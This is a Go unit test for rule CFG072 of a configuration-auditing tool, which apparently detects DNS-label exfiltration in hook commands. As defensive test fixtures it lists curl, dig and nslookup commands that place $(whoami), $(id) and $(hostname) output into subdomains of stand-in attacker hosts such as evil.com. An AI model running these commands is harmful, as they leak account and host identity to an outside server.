// Copyright the cfgaudit contributors
// SPDX-License-Identifier: Apache-2.0

package rules

import (
	"testing"

	"github.com/cfgaudit/cfgaudit/internal/finding"
)

// #1369: a substitution that is the whole URL host is not DNS-label exfil;
// one followed by more label characters before the dot still is. Cases from
// PR #1385 and its review.
func TestCFG072WholeHost1369(t *testing.T) {
	for _, cmd := range []string{
		`curl "https://$(whoami).collect.example.com/"`,
		`curl "http://$(whoami)x.evil.com/"`,
		`curl "http://$(id)-$(whoami).evil.com/"`,
		`dig $(whoami)x.evil.com`,
		`nslookup $(id)-$(hostname).evil.com`,
	} {
		f := CFG072.Check(hookTarget(t, cmd))
		if len(f) != 1 || f[0].Severity != finding.Error {
			t.Errorf("%q: want one error, got %+v", cmd, f)
		}
	}
	for _, cmd := range []string{
		`BASE_URL=http://$(curl -s -4 -m 5 ifconfig.me 2>/dev/null || hostname -I | cut -d" " -f1):13000`,
		`curl "http://$(hostname)/health"`,
		`curl "http://$(hostname):8080/status"`,
		"curl \"http://`hostname`/health\"",
	} {
		if f := CFG072.Check(hookTarget(t, cmd)); len(f) != 0 {
			t.Errorf("%q: want none, got %+v", cmd, f)
		}
	}
}
